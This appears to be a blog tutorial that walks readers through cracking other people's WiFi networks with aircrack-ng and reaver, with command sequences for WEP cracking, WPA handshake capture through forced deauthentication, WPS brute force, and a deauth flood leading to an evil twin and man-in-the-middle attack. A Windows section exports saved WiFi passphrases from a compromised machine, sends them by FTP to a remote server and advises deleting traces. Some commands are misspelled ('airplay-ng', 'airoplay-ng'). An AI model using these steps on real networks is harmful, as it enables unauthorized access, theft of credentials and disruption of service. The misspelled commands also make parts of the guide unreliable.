# How to crack any WiFi (WEP-WPA-WPA2-WPA3-WPS)


I'm assuming that you are successfully operating a proper GNU/Linux distribution (if not, go check this [tutorial](/tutorials/install-arch-linux-uefi-with-luks-encrypted-root-and-swap-filesystems/)) and that you're not lame enough to imagine connecting to a WiFi network without a WiFi card or a USB WiFi adapter.


## First things first
---
When you go on the Internet, everything you see or download is actually contained in thousands of little messages (a bit like postal mail) that are then put back in order by your computer. These messages (like mail) have a header (recipient, sender, date, etc.) and a content.

The problem with WiFi is that all those messages are being sent over the air in a range up to 100 m (~350ft) around your access point (AP).
Hence, multiple technologies are used by WiFi routers to encrypt those messages. 

The oldest one is WEP (and it is also the least secure). You have also WPA, WPA2 and also WPA3. To keep it simple, the only thing that changes between those three technologies is the strength of the crytography being used.

*What is a MAC address?*

A MAC address is a bit like the serial number of your computer (of your network card, to be exact). By default, the address used is the one written on your network card, but you can tell your computer to use another one (this option is a bit hidden on Windows, I'll come back to it in a future article)

On the Internet, EVERYTHING has a MAC address (computer, phone, internet box, coffee maker, alarm clock, etc.) as soon as something accesses the Internet, it has a MAC address. The MAC address of a WiFi router is also called BSSID

## Configure Aircrack
---
We will be using Aircrack-ng software suite throughout this documentation

{{< figure src="/images/tutorials/wifi/wifi-crack/wifi-crack.png" alt="crack-wifi" >}} 
### List interfaces

Shows the available interface :

```bash
airmon-ng 
```
### Enable monitor mode

Enable monitor mode and list all processes that may cause trouble. That may be e.g. dhclient (DHCP client), the Network Manager or wpa_suppicant :

```bash
airmon-ng start wlan0
```
### Ensure no disturbance

So we just kill that processes, repeat if there are more :

```bash
kill 2222
```
### Find target

Now the available access points (AP) are shown with some properties :

```bash
airodump-ng wlan0
```

## WEP (Easy)
---
To crack WEP, copy the BSSID (Mac Address) of the target AP wiht WEP as CIPHER.
### Capture the data

```bash
airodump-ng -c 10 -w dumpfile -bssid ${mac} mon0
```
Now it is listening for data. Wait for "#Data" to be high enough

{{< figure src="/images/tutorials/wifi/wifi-crack/wifi-crack2.png" alt="crack-wifi" >}} 

### Auth and cause traffic

Beware, this is not to be used on monitored networks as it can alert IDS.

```bash
airplay-ng -1 0 -a ${mac} mon0
```

ask for authentication

```bash
airplay-ng -1 1 -a ${mac} mon0
```

Cause traffic, check if data goes up. If not, the channel is wrong one : cancel and restart

```bash
airplay-ng -3 -b ${mac} mon0
```

wait for arp request

```bash
aircrack-ng dumpfile-0.cap
```

tries to crack
if it fails try next cap file

if succeeded, key is found

## WPA-WPA2-WPA3 (Medium)
---
To crack WPA, you need to enforce auth by a client

you will need a very good dictionary to crack the key
### Start monitor

```bash
airmon-ng start wlan0
```
Kill the listed processes
### Get BSSID of target

```bash
airodump-ng wlan0
```

copy the mac address desired and memorize the channel

new terminal
```bash
airodump-ng -c $chan --bssid $mac -w ~/Desktop/dumpfile
```

dump the data, here handshakes are needed not just data
you also see some more macs of connected stations that we'll need soon
### Force new handshakes

stop scanning instances if still running

```bash
airoplay-ng -0 -2 -a $ap-mac -c $client-mac mon0
```

repeat until you find on the correct channel

then deauthenticated the clients and captures the handshake
### Cracking cap file

after collecting some handshakes, you might start the cracking process

```bash
aircrack-ng -a 2 -b $ap-mac -w wordlistfile ~/Desktop/*.cap
```

## WPS (Medium)
---
An alternative to word lists may be the use of WPS "squatting". Reaver is a tool allowing to obtain a password using this method.

Depending on the target's Access Point (AP), to recover the plain text WPA/WPA2 passphrase, the average amount of time for the transitional online brute force method is between 4-10 hours. 

In practice, it will generally take half this time to guess the correct WPS pin and recover the passphrase. When using the offline attack, if the AP is vulnerable, it may take only a matter of seconds to minutes.

See the GitHub [repository](https://github.com/t6x/reaver-wps-fork-t6x) for more informations  

*Note: newer versions of wps are not vulnerable anymore*

## Using Windows (Simple but Difficult)

{{< figure src="/images/tutorials/wifi/wifi-crack/wifi-crack1.png" alt="crack-wifi" >}} 

In case WiFi is secured properly, your best bet might be to attack directly a client (e.g. Windows which is the perfect operating system to find the passphrases in). 

But you will need to firstly get a control (physical or remote) onto the targeted client in order to successfully extract and exfiltrate the WiFi passphrase :
### Copy the passphrase

```cmd
mkdir c:\temp
netsh wlan export profile folder=c:\temp
#netsh wlan add profile filename="theXMLexport.xml"
```

*Note: events on Windows are logged by eventmanager !*

This is a snippet for connecting to ftp : 

```cmd
::just to copy the file to a remote machine
@ftp -i -s:"%~f0"&GOTO:EOF
open server.net
my_username
my_password
!:---FTP commands following here---
cd location/for/storage
put c:\Temp\*.xml
disconnect
quit
::now delete traces
```
### show plaintext passphase on a Windows

```cmd
netsh
$ add profile filename="theXMLexport.xml" user=all
$ wlan show profiles
```

Then open network settings for WiFi
There you can show the key

## DOS AP (Difficult)
---
{{< figure src="/images/tutorials/wifi/wifi-crack/wifi-crack2.jpeg" alt="crack-wifi" >}} 
### List networks again

Copy the MAC address
### Find clients connected

```bash
airodump-ng -c $channel --bssid $ap-mac
```

Now again you see the clients connected to the AP listed below
this can be accomplished with the first instance using hotkeys "a" for switching views and "s" for sorting,
try finding an active client where DOS would have the best chance to trigger a reconnection.
### Disconnect the target

```bash
aireplay-ng --deauth 1000 -a $ap-mac -c $client-mac mon0
```

This causes the client to loose connection and probably reconnect manually

Now you can put a rogue AP (see evil twin attack). That way, the client will try to connect to your AP. 
After that you have the possibility to conduct a man-in-the-middle (MITM) attack as long as it is not end-to-end encrypted.

## Make a good action !
---
Hit that `CTRL + D` to bookmark this website 🔖

Internet is for sharing, so please consider sharing this post if you liked it !

It will be so much better than any newsletter #privacy #spam #planet 🌍 ❤️

